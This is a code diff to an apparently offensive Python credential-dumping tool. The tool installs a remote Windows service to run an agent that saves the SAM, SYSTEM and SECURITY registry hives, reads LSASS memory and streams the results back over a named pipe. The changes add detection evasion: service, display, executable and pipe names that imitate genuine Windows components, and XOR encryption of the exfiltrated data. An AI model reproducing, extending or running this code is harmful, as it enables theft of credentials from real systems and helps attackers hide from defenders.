@@ -17,8 +17,52 @@ from ..rpc.svcctl import SvcCtl
 AGENT_MAGIC = b'PYD\x01'
 
 
+def _xor_cipher(data: bytes, key: str) -> bytes:
+    kb = key.encode('ascii')
+    klen = len(kb)
+    out = bytearray(len(data))
+    for i, b in enumerate(data):
+        out[i] = b ^ kb[i % klen]
+    return bytes(out)
+
+
 def random_name(length: int = 8) -> str:
     return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))
+
+
+_SERVICE_NAMES = [
+    "WinDiagSvc", "TelemetryHost", "DeviceAssocSvc", "NetProfService",
+    "WpnUserSvc", "AppReadiness", "DiagTrackHelper", "StateRepository",
+    "TokenBrokerSvc", "CloudIdentitySvc", "CredentialEnrollSvc",
+    "SecurityHealthSvc", "PrintWorkflowSvc", "NaturalAuthSvc",
+]
+
+_DISPLAY_NAMES = {
+    "WinDiagSvc": "Windows Diagnostics Service",
+    "TelemetryHost": "Connected Devices Telemetry Host",
+    "DeviceAssocSvc": "Device Association Service",
+    "NetProfService": "Network Profile Service",
+    "WpnUserSvc": "Windows Push Notifications User Service",
+    "AppReadiness": "App Readiness Service",
+    "DiagTrackHelper": "Diagnostics Tracking Helper",
+    "StateRepository": "State Repository Service",
+    "TokenBrokerSvc": "Token Broker Service",
+    "CloudIdentitySvc": "Cloud Identity Service",
+    "CredentialEnrollSvc": "Credential Enrollment Service",
+    "SecurityHealthSvc": "Windows Security Health Service",
+    "PrintWorkflowSvc": "Print Workflow Service",
+    "NaturalAuthSvc": "Natural Authentication Service",
+}
+
+_AGENT_NAMES = [
+    "svcdiag.exe", "telhost.exe", "diagtrack.exe", "wshelper.exe",
+    "netprofsvc.exe", "credprov.exe", "tokensvc.exe",
+]
+
+_PIPE_PREFIXES = [
+    "epmapper_", "wkssvc_", "spoolss_", "lsarpc_", "netlogon_",
+    "samr_", "srvsvc_",
+]
 
 
 @dataclass
@@ -37,10 +81,10 @@ class PipeDump:
     1. Enables SeBackupPrivilege
     2. RegSaveKey SYSTEM/SAM/SECURITY → reads into memory → deletes temp files
     3. If PID > 0: reads LSASS memory via indirect syscalls
-    4. Streams everything through a named pipe
+    4. Streams everything through a named pipe (XOR-encrypted with pipe name)
     5. Self-deletes from disk
 
-    Wire protocol:
+    Wire protocol (after XOR decryption):
       "PYD\\x01" (4-byte magic)
       <u32 system_size><system_data>
       <u32 sam_size><sam_data>
@@ -53,15 +97,17 @@ class PipeDump:
         self.agent_path = agent_path
 
     def execute(self, do_registry: bool = True, lsass_pid: int = 0) -> AgentResult:
-        pipe_name = random_name(12)
-        svc_name = random_name(10)
-        agent_name = f"{random_name()}.exe"
+        pipe_name = secrets.choice(_PIPE_PREFIXES) + random_name(6)
+        base_name = secrets.choice(_SERVICE_NAMES)
+        svc_name = f"{base_name}_{secrets.randbelow(900) + 100}"
+        display_name = _DISPLAY_NAMES[base_name]
+        agent_name = secrets.choice(_AGENT_NAMES)
 
         mode = (1 if do_registry else 0) | (2 if lsass_pid > 0 else 0)
         self._upload_agent(agent_name)
         binary_path = f"C:\\Windows\\Temp\\{agent_name} {mode} {lsass_pid} {pipe_name}"
 
-        t = threading.Thread(target=self._exec_via_service, args=(svc_name, binary_path), daemon=True)
+        t = threading.Thread(target=self._exec_via_service, args=(svc_name, display_name, binary_path), daemon=True)
         t.start()
 
         try:
@@ -73,7 +119,7 @@ class PipeDump:
             except Exception:
                 pass
 
-        return self._parse_output(raw)
+        return self._parse_output(raw, pipe_name)
 
     def find_lsass_pid(self) -> int:
         with self.session.open_pipe("svcctl") as pipe:
@@ -85,7 +131,9 @@ class PipeDump:
             svc.close_handle(svc_handle)
             return pid
 
-    def _parse_output(self, data: bytes) -> AgentResult:
+    def _parse_output(self, data: bytes, pipe_name: str) -> AgentResult:
+        data = _xor_cipher(data, pipe_name)
+
         if len(data) < 4 or data[:4] != AGENT_MAGIC:
             raise RuntimeError("Invalid agent output (bad magic)")
 
@@ -112,14 +160,14 @@ class PipeDump:
             lsass_dump=lsass_dump,
         )
 
-    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
+    def _exec_via_service(self, svc_name: str, display_name: str, cmd: str) -> None:
         with self.session.open_pipe("svcctl") as pipe:
             svc = SvcCtl(pipe)
             svc.bind()
             svc.open_sc_manager()
             svc_handle = svc.create_service(
                 service_name=svc_name,
-                display_name=svc_name,
+                display_name=display_name,
                 binary_path=cmd,
             )
             try:
